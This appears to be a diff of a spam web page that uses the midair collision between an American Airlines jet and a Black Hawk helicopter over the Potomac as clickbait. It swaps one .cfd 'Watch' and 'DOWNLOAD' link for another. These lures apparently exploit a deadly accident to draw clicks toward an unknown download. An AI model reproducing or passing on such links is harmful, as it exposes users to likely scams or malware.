@@ -2,9 +2,9 @@
 
 American Airlines plane vs. Blackhawk crash in DC
 
-Watch 🟢 ➤ ➤ ➤ <a href="https://pyblox.cfd/jancial"> 🌐 Click Here To link (The Blackhawk sees to be almost TOTALLY dark.) 
+Watch 🟢 ➤ ➤ ➤ <a href="http://plorix.cfd/jasdyfaads"> 🌐 Click Here To link (The Blackhawk sees to be almost TOTALLY dark.) 
 
-🔴 ➤►DOWNLOAD👉👉🟢 ➤<a href="https://pyblox.cfd/jancial"> 🌐 Click Here To link (The Blackhawk sees to be almost TOTALLY dark.) 
+🔴 ➤►DOWNLOAD👉👉🟢 ➤<a href="http://plorix.cfd/jasdyfaads"> 🌐 Click Here To link (The Blackhawk sees to be almost TOTALLY dark.) 
 
 What we know about the midair collision between a Black Hawk helicopter and passenger jet over the Potomac River
 
